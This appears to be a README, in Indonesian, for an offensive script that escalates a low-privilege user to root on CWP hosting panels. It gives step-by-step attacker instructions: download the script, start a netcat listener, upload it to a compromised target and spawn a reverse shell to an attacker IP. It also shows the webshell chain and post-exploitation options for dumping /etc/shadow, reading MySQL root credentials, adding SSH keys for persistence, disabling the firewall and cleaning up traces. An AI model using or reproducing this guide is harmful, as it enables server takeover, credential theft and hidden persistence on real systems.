## Instalasi

```bash
# Clone repository
wget https://raw.githubusercontent.com/dombatersesat666/cwp-lpe/refs/heads/main/cwp.sh


# Beri permission eksekusi
chmod +x cwp.sh
```

---

## Cara Penggunaan

### Mode 1: Interactive Menu

Jalankan tanpa argumen untuk masuk ke interactive menu setelah chain berhasil:

```bash
./cwp.sh
```

**Tampilan menu:**

```
══════════════════════════════════
  ROOT SHELL MENU
══════════════════════════════════
  1. Execute command
  2. Get reverse shell
  3. Dump /etc/shadow
  4. Get root MySQL creds
  5. Add SSH key (persistence)
  6. Cleanup & exit

> Select option:
```

---

### Mode 2: Auto Reverse Shell

Langsung spawn reverse shell ke attacker machine tanpa memasuki menu:

```bash
./cwp.sh --reverse <ATTACKER_IP> <PORT>
```

**Contoh:**

```bash
./cwp.sh --reverse 192.168.1.100 4444
```

Sebelum menjalankan, siapkan listener di attacker machine:

```bash
nc -lvnp 4444
```

---

## Tutorial Lengkap Step-by-Step

### Langkah 1 — Persiapan Attacker

Buka terminal baru dan jalankan netcat listener:

```bash
nc -lvnp 4444
```

### Langkah 2 — Upload Script ke Target

Dari shell yang sudah ada di target (sebagai user `pajak`):

```bash
# Upload via wget/curl dari attacker HTTP server
wget http://<ATTACKER_IP>:8080/cwp.sh -O /tmp/cwp.sh
chmod +x /tmp/cwp.sh
```

### Langkah 3 — Jalankan Exploit

**Mode Interactive:**
```bash
cd /tmp
./cwp.sh
```

**Mode Otomatis (langsung reverse shell):**
```bash
./cwp.sh --reverse 192.168.1.100 4444
```

### Langkah 4 — Verifikasi Root Access

Jika berhasil, output akan menampilkan:

```
[+] cwpsvc shell active: uid=xx(cwpsvc) gid=xx(cwpsvc) groups=xx(cwpsvc)
[+] ROOT SHELL ACTIVE!
[+] Response: uid=0(root) gid=0(root) groups=0(root)
```

### Langkah 5 — Post Exploitation via Menu

Setelah root shell aktif, pilih opsi dari menu:

```
> Select option: 3     # Dump /etc/shadow
> Select option: 4     # Baca MySQL root creds
> Select option: 5     # Pasang SSH key untuk persistence
```

Contoh menambahkan SSH key:

```
> Select option: 5
  SSH Public Key: ssh-rsa AAAA...your_public_key... user@attacker
[+] SSH key added
```

Kemudian akses sebagai root via SSH:

```bash
ssh root@<TARGET_IP>
```

### Langkah 6 — Cleanup

Script secara otomatis membersihkan artifacts saat keluar (trap EXIT).  
Untuk manual cleanup, pilih opsi `6` dari menu.

---

## Alur Exploit (Flow Diagram)

```
[User: www]
     │
     │ Write webshell ke Roundcube temp
     ▼
[cwpsvc webshell] ─── curl https://localhost:2031/roundcube/temp/cmd_xxx.php?cmd=id
     │
     │ Write root webshell ke user_api dir
     ▼
[root webshell] ─── curl http://127.0.0.1:2302/r_xxx.php?cmd=id
     │
     │ uid=0(root)
     ▼
[ROOT ACCESS]
     │
     ├── Execute arbitrary commands
     ├── Spawn reverse shell
     ├── Dump /etc/shadow
     ├── Read MySQL creds
     └── Add SSH persistence
```

---

## File yang Dibuat Saat Exploit

| File | Lokasi | Dihapus Saat Exit |
|------|--------|-------------------|
| cwpsvc webshell | `/usr/local/cwpsrv/var/services/roundcube/temp/cmd_<timestamp>.php` | Ya |
| root webshell | `/usr/local/cwpsrv/var/services/user_api/r_<timestamp>.php` | Ya |

---

## Troubleshooting

**Error: Cannot write to `/usr/local/cwpsrv/var/services/roundcube/temp`**
- Pastikan user yang menjalankan script memiliki write permission ke direktori tersebut.

**Error: cwpsvc shell failed**
- Verifikasi CWP panel berjalan di port `2031`.
- Cek apakah Roundcube aktif di instalasi CWP.

**Error: Root shell failed**
- Verifikasi User API service berjalan di port `2302`.
- Cek apakah `user_api` directory writable oleh `cwpsvc`.

**Reverse shell tidak masuk**
- Pastikan listener sudah berjalan sebelum menekan ENTER.
- Cek firewall/CSF — script akan mencoba disable CSF secara otomatis sebelum spawn shell.

---

## Author

**Matigan1337**

---

## License

Tool ini dirilis untuk keperluan **edukasi dan penetration testing yang sah**.  
Dilarang keras menggunakan tool ini untuk aktivitas ilegal.
